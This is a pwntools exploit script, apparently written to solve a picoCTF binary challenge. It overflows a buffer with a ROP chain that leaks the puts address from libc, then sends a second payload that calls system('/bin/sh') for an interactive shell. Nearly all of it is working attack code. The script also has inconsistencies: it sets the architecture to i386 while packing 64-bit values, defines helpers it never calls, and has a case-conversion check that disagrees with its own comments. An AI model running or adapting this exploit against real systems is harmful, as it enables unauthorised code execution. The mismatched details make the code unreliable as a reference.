#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './vuln'
libc = './libc.so.6'
BIN = ELF(exe)
LIBC = ELF(libc)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        if args.REMOTE:
            return remote('mercury.picoctf.net', 49464)

        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

def convert_case(ch, index):
    ch = ord(ch)
    # if (((char)uVar1 < 'a') || ('z' < (char)uVar1)) {
    if ch < ord('a') or ch > ord('z'):
        # if (((char)uVar1 < 'A') || ('Z' < (char)uVar1)) {
        if ch < ord('A') or ch > ord('Z'):
            # uVar2 = arg1 & 0xff;
            result = ch & 0xff
        # } else {
        else:
            #     if ((arg2 & 1U) == 0) {
            if ch & 1:
            #         uVar2 = arg1 & 0xff;
                result = ch & 0xff
            #     } else {
            else:
            #         uVar2 = (uint64_t)(uVar1 + 0x20);
                result = ch + 0x20
            #     }
            # }
        # } else {
    else:
            # if ((arg2 & 1U) == 0) {
        if index & 1:
            #     uVar2 = (uint64_t)(uVar1 - 0x20);
            result = ch - 0x20
            # } else {
        else:
            #     uVar2 = arg1 & 0xff;
            result = ch & 0xff
            # }
        # }
    # return uVar2;
    return result

def convert(s):
    result = b''
    for index, ch in enumerate(s):
        result += chr(convert_case(ch, index)).encode()

    print(result)
    return result

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

OFFSET = 136
rop = ROP(exe)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
puts_got = BIN.got['puts']
puts_plt = BIN.plt['puts']
main_plt = BIN.symbols['main']

payload = b'A'*(OFFSET) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
io.sendline(payload)
io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b'\0')) - LIBC.symbols['puts']
log.success('Got leak: {}'.format(hex(leak)))
LIBC.address = leak

ret = rop.find_gadget(['ret']).address
payload = b'x'*OFFSET + p64(ret) + p64(pop_rdi) + p64(next(LIBC.search(b'/bin/sh'))) + p64(LIBC.sym.system) + p64(main_plt)
io.sendline(payload)

io.interactive()

